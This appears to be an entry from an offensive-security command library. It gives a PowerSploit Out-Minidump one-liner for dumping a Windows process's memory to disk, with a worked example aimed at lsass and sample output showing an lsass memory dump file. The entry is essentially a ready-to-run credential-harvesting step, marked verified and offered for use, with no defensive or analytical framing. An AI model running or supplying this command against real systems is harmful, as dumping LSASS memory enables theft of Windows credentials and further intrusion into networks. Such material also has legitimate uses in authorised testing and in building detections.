---
id: 4fd339e9-d58a-4879-90e2-85c12cede31a
name: out-minidump-dump-memory-of-process
type: command
executor: powershell
data: Get-Process -Name $_NAME | Out-Minidump -DumpFilePath $_PATH
output: |-
  Directory: C:\temp
  Mode LastWriteTime Length Name
  ---- ------------- ------ ----
  -a---- 1/2/2020 lsass_1234.dmp
created_at: '2020-01-02T19:41:41.009034+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - memory-dump
verified: true
validated: true
---

# out-minidump-dump-memory-of-process

## Command

```powershell
Get-Process -Name $_NAME | Out-Minidump -DumpFilePath $_PATH
```

## Description

Dumps memory of specified process to file using PowerSploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Name $_NAME | Process name | Yes |
| -DumpFilePath $_PATH | Output directory | Yes |

## Examples

### Basic Usage

```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath C:\temp
```

## Expected Output

DMP files listed.

## Related

- [[procedures/dump-process-memory-powershell]]
